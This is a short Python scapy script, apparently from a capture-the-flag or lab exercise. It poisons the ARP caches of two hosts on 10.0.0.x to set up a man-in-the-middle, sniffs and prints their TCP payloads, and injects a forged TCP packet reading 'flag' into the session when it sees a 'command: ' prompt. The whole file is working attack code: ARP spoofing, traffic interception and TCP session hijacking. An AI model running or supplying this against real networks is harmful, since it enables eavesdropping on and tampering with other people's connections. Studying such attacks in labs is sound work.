from scapy.all import *

def print_packet(packet):
    if packet.haslayer(IP):
        ip_s = packet[IP].src
        ip_d = packet[IP].dst
        if packet.haslayer(TCP):
            s_port = packet[TCP].sport
            d_port = packet[TCP].dport
            seq = packet[TCP].seq
            ack = packet[TCP].ack
            if packet.haslayer(Raw):
                data = packet[Raw].load
                print(f"IP: {ip_s} -> {ip_d}, Port: {s_port} -> {d_port}, Seq: {seq}, Ack: {ack}, Data: {data}")
                if data == b"command: ":
                    send(IP(src="10.0.0.2", dst="10.0.0.3")/TCP(sport = d_port, dport= s_port, seq = ack, ack=seq+1, flags="PA")/Raw(b"flag"))
arp_packet = ARP(op=2, psrc="10.0.0.2", hwsrc="2e:be:05:72:15:cd", pdst="10.0.0.3")
send(arp_packet)
arp_packet = ARP(op=2, psrc="10.0.0.3", hwsrc="2e:be:05:72:15:cd", pdst="10.0.0.2")
send(arp_packet)
sniff(filter="tcp", iface="eth0", count=0,prn=print_packet)
